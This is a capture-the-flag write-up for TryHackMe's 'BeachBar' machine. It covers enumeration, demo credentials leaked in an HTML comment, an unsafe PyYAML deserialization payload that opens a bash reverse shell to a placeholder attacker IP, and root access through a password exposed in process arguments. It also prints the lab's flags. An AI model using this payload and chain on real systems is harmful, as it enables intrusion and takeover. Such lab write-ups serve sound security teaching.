# TryHackMe - BeachBar Writeup

> **Platform:** TryHackMe
> **Challenge:** BeachBar
> **Category:** Linux | Web Security | YAML Deserialization | Privilege Escalation

---

# Overview

Today we are back with another Linux Boot2Root challenge from **TryHackMe** named **BeachBar**.

This machine revolves around a vulnerable web application running a beachside jukebox service. The attack chain begins with discovering hardcoded credentials left inside the application's source code, followed by exploiting an insecure YAML deserialization vulnerability to obtain Remote Code Execution. After gaining an initial shell, local enumeration reveals a privileged service exposing reusable credentials, ultimately leading to full root access.

This room demonstrates how insecure development practices such as leaving demo credentials enabled, unsafe deserialization, and password reuse can completely compromise an otherwise simple application.

---

# Challenge Scenario

The challenge begins with the following briefing.

> Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone. You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something".

> The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.

From the scenario itself, we can already infer that the challenge is likely focused on a web application where developer shortcuts have introduced security issues.

---

# Target Information

| Information      | Value            |
| ---------------- | ---------------- |
| Machine Name     | BeachBar         |
| Platform         | TryHackMe        |
| Difficulty       | Boot2Root        |
| Operating System | Linux            |
| Target IP        | **10.48.163.51** |

---

# Initial Reconnaissance

As with every assessment, the first step is identifying the exposed attack surface.

A complete TCP scan is performed.

```bash
nmap -p- 10.48.163.51
```

The results reveal only two open ports.

```text
22/tcp   SSH
80/tcp   HTTP
```

Since SSH requires valid credentials, the web application immediately becomes the primary target.

---

# Service Enumeration

To gather additional information about the web server, a version and default script scan is performed.

```bash
nmap -sC -sV 10.48.163.51
```

Important findings include:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 9.6p1 |
| 80   | HTTP    | Gunicorn      |

Nmap also reports that visiting the root page redirects users to:

```text
/login
```

The webpage title is:

```text
Beach Bar // Sign in
```

This suggests that authentication is required before interacting with the application.

---

# Initial Web Enumeration

Opening the webpage displays a **DJ Login Portal**.

Rather than immediately attempting brute-force attacks, the first step is inspecting the page source.

Developers frequently leave debugging comments or forgotten notes inside HTML.

Viewing the source reveals an extremely interesting comment.

```html
<!--
staff note:

the demo DJ login is still enabled for the soft opening.

dj / dj

swap this before the season starts

(ticket BAR-7)
-->
```

This is one of the most common real-world mistakes made during development.

Temporary accounts are created during testing but are never removed before deployment.

The comment explicitly provides valid credentials.

```text
Username:
dj

Password:
dj
```

---

# Directory Enumeration

Before logging into the application, directory enumeration is performed to understand the application's attack surface.

Gobuster is used.

```bash
gobuster dir \
-u http://10.48.163.51 \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

The scan returns:

```text
/dashboard

/export

/import

/login

/logout
```

Most of these endpoints redirect unauthenticated users back to the login page.

This indicates that authentication is required before any further functionality becomes available.

---

# Authenticating to the Application

Using the credentials discovered inside the HTML source:

```text
Username:
dj

Password:
dj
```

authentication succeeds immediately.

After logging in, additional application functionality becomes accessible.

Instead of a simple music dashboard, the application exposes playlist import and export features.

Import functionality should always be inspected carefully because many applications deserialize user-controlled data.

---

# Discovering the Vulnerability

While testing the playlist import feature, it becomes apparent that uploaded YAML files are being processed directly by the backend.

Researching common Python YAML vulnerabilities reveals that applications using **PyYAML** insecurely may deserialize arbitrary Python objects.

This is commonly referred to as an **Unsafe YAML Deserialization** vulnerability.

Instead of treating uploaded YAML purely as data, unsafe loaders execute embedded Python objects.

This behavior can directly result in Remote Code Execution.

---

# Crafting the Payload

A malicious YAML payload is created.

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

Instead of importing playlist data, this payload instructs Python to execute the `os.system()` function.

The command opens a reverse shell back to the attacking machine.

---

# Receiving the Reverse Shell

A Netcat listener is started.

```bash
nc -lvnp 4444
```

After submitting the malicious YAML file, the listener immediately receives a connection.

```text
Connection received

uid=1001(bartender)

gid=1001(bartender)
```

Remote Code Execution has been achieved.

The initial shell runs as:

```text
bartender
```

---

# Stabilizing the Shell

The shell initially lacks job control and proper terminal functionality.

A fully interactive shell is created using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After suspending the shell:

```text
CTRL + Z
```

the attacker's terminal is configured.

```bash
stty raw -echo
```

The shell is then restored.

```bash
fg
```

Finally:

```bash
export TERM=xterm-256color
```

provides a stable interactive Bash session.

---

# User Flag

Now that a stable shell is available, the home directory is inspected.

Reading the user flag:

```bash
cat /home/bartender/user.txt
```

returns:

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

Initial access has now been achieved.

---

# Privilege Escalation Enumeration

With the user flag captured, the next objective is obtaining root access.

Checking sudo permissions:

```bash
sudo -l
```

does not reveal any useful privilege escalation path.

Instead of relying solely on sudo, process enumeration is performed.

Listing running processes reveals something very interesting.

```text
root

/opt/beach-bar/venv/bin/python

/opt/beach-bar/jukeboxd/jukeboxd.py

--stream-pass

SunsetSpritz2024!
```

This immediately stands out for two reasons.

1. The process is executing as **root**.
2. The command line exposes a plaintext password.

This is an excellent example of why sensitive information should never be supplied as command-line arguments.

Any local user capable of listing processes can recover these values.

---

# Understanding the Privilege Escalation

Although the current shell belongs to the **bartender** user, the discovered password suggests possible credential reuse.

Rather than searching for complicated privilege escalation vulnerabilities, the simplest approach is attempting to authenticate as root.

```bash
su root
```

When prompted, the recovered password is supplied.

```text
SunsetSpritz2024!
```

Authentication succeeds.

The process owner reused the same password for the root account.

The prompt immediately changes.

```text
root@tryhackme
```

Verifying privileges:

```bash
id
```

returns:

```text
uid=0(root)
```

The privilege escalation is complete.

---

# Root Flag

Reading the final flag:

```bash
cat /root/root.txt
```

returns:

```text
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

The machine has now been fully compromised.

---

# Attack Flow

```text
Nmap Enumeration
        │
        ▼
Discover HTTP Login Portal
        │
        ▼
Inspect HTML Source
        │
        ▼
Recover Demo Credentials
        │
        ▼
Authenticate as DJ
        │
        ▼
Enumerate Import Functionality
        │
        ▼
Identify Unsafe YAML Deserialization
        │
        ▼
Craft Malicious YAML Payload
        │
        ▼
Remote Code Execution
        │
        ▼
Reverse Shell as bartender
        │
        ▼
Stabilize Shell
        │
        ▼
Enumerate Running Processes
        │
        ▼
Recover Root Process Password
        │
        ▼
Reuse Credentials with su
        │
        ▼
Root Shell
        │
        ▼
Capture Root Flag
```

---

# Vulnerabilities Identified

* Demo credentials left enabled in production
* Credentials exposed in HTML source comments
* Unsafe PyYAML deserialization
* Arbitrary command execution through YAML payloads
* Plaintext secrets exposed in process arguments
* Password reuse between privileged services and root account

---

# Key Takeaways

BeachBar is a practical example of how several seemingly small security mistakes can combine into a complete system compromise. The attack began with credentials unintentionally left inside an HTML comment, allowing access to a privileged area of the application. From there, an unsafe YAML deserialization vulnerability resulted in Remote Code Execution without requiring any sophisticated exploit development.

The privilege escalation phase reinforces another important lesson: local enumeration should always include reviewing running processes. Sensitive command-line arguments are visible to other local users on many systems, and exposing secrets in this manner can be just as dangerous as storing them in plaintext configuration files. In this case, the leaked stream password was reused for the root account, making privilege escalation straightforward.

This machine highlights the importance of removing development credentials before deployment, using safe YAML loaders, avoiding plaintext secrets in process arguments, and enforcing unique passwords for privileged accounts.
